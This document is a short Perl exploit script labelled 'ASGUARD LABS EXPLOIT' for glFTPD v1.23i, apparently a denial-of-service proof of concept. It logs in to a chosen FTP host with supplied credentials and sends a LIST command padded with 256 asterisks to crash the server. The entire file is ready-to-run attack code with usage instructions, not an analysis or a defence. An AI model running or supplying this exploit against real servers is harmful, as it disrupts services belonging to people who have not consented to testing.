#!/usr/bin/perl

use IO::Socket;
use Socket;

print "-= ASGUARD LABS EXPLOIT - glFTPD v1.23i =-\n\n";

if($#ARGV < 2 | $#ARGV > 3) { die "usage: perl gl123DOS.pl <host> <user>
<pass> [port]\n" };
if($#ARGV > 2) { $prt = $ARGV[3] } else { $prt = "21" };

$adr = $ARGV[0];
$usr = $ARGV[1];
$pas = $ARGV[2];
$err = "*" x 256;

$remote = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>$adr,
PeerPort=>$prt, Reuse=>1) or die "Error: can't connect  to $adr:$prt\n";

$remote->autoflush(1);

print $remote "USER $usr\n" and print "1. Sending : USER $usr...\n" or die
"Error: can't send user\n";

print $remote "PASS $pas\n" and print "2. Sending : PASS $pas...\n"  or die
"Error: can't send pass\n";

print $remote "LIST $err/\n" and print "3. Sending : ErrorCode...\n\n"or die
"Error: can't send error code\n";

print "Attack done. press any key to exit\nnote: Attack done doesn't mean
Attack successful\n";
$bla= <STDIN>;
close $remote;

